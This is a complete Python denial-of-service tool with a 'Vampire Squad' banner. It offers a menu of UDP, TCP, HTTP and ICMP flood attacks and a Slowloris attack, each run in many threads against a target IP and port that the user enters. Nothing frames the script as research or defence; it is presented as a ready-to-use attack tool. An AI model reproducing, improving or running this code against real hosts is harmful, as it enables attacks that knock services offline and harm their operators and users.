#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import socket
import random
import threading
import time
import sys

# Clear Screen
os.system("clear")

# Skeleton Logo in Red
logo = """
\033[1;31m
        _______
     .-'       `-.
    /           \\
    |  .--. .--.  |
    | (    Y    ) |
    (  '--' '--'  )
     \         /
      `._.-._.'
██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗
██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝
██║   ██║███████║██╔████╔██║██████╔╝██║██║  ██║█████╗  
██║   ██║██╔══██║██║╚██╔╝██║██╔═══╝ ██║██║  ██║██╔══╝  
╚██████╔╝██║  ██║██║ ╚═╝ ██║██║     ██║██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝
Author: Muhammad Shourov (Vampire) | Team: Vampire Squad
GitHub: https://github.com/vampiresquad
\033[0m
"""

print(logo)
print("-" * 60)

# Attack Functions
def udp_flood(ip, port, threads):
    def run():
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                s.sendto(data, (ip, port))
            except:
                break
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()

def tcp_flood(ip, port, threads):
    def run():
        data = random._urandom(2048)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(data)
                s.close()
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()

def http_flood(ip, port, threads):
    def run():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()

def icmp_flood(ip, threads):
    def run():
        while True:
            os.system(f"ping -c 1 {ip} > /dev/null")
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()

def slowloris(ip, port, threads):
    def run():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"Host: {ip}\r\n".encode("utf-8"))
                while True:
                    s.send("X-a: b\r\n".encode("utf-8"))
                    time.sleep(15)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()

# Menu
def menu():
    while True:
        print("\n\033[1;36m[ MENU ]\033[0m")
        print("1. UDP Flood Attack")
        print("2. TCP Flood Attack")
        print("3. HTTP Flood Attack")
        print("4. ICMP Ping Flood")
        print("5. Slowloris Attack")
        print("6. Exit\n")

        choice = input("Choose an option (1-6): ").strip()

        if choice in ['1', '2', '3', '5']:
            ip = input("Enter Target IP: ").strip()
            port = int(input("Enter Target Port: ").strip())
            threads = int(input("Number of Threads: ").strip())

            print(f"\n\033[1;32mStarting Attack on {ip}:{port} with {threads} threads...\033[0m\n")
            time.sleep(1)

            if choice == '1':
                udp_flood(ip, port, threads)
            elif choice == '2':
                tcp_flood(ip, port, threads)
            elif choice == '3':
                http_flood(ip, port, threads)
            elif choice == '5':
                slowloris(ip, port, threads)

        elif choice == '4':
            ip = input("Enter Target IP: ").strip()
            threads = int(input("Number of Threads: ").strip())
            icmp_flood(ip, threads)

        elif choice == '6':
            print("\033[1;33mGoodbye, Vampire!\033[0m")
            sys.exit()
        else:
            print("\033[1;31mInvalid option. Try again.\033[0m")

# Start Menu
menu()
